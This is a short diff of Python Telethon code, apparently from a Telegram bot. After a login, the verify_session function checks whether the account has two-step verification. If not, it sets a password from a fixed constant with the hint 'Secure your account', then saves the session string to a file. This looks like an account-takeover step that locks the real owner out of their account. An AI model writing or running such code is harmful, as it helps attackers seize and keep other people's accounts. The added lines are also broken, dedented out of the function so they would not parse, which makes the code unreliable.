@@ -268,18 +268,16 @@ async def verify_session(user_id, msg):
         )
         await msg.reply(first_success_text)
 
-        # Check if 2FA is set, if not set it automatically
-        password_info = await client(functions.account.GetPasswordRequest())
-        if not password_info.has_password:
-            # Correct usage for setting 2FA in recent Telethon versions:
-            await client(functions.account.UpdatePasswordSettingsRequest(
-                current_password=types.InputCheckPasswordEmpty(),
-                new_settings=types.account.PasswordInputSettings(
-                    new_algo=password_info.new_algo,
-                    new_password_hash=password_info.new_password_hash,  # Note: Usually you need to hash your password, but for simple demo we pass None or adapt
-                    hint="Secure your account"
-                )
-            ))
+     # Check if 2FA is set, if not set it automatically
+password_info = await client(functions.account.GetPasswordRequest())
+if not password_info.has_password:
+    await client(functions.account.UpdatePasswordSettingsRequest(
+        current_password=types.InputCheckPasswordEmpty(),
+        new_settings=types.account.PasswordInputSettings(
+            new_password=SESSION_2FA_PASSWORD,
+            hint="Secure your account"
+        )
+    ))
 
         # Save session string to file
         session_str = client.session.save()
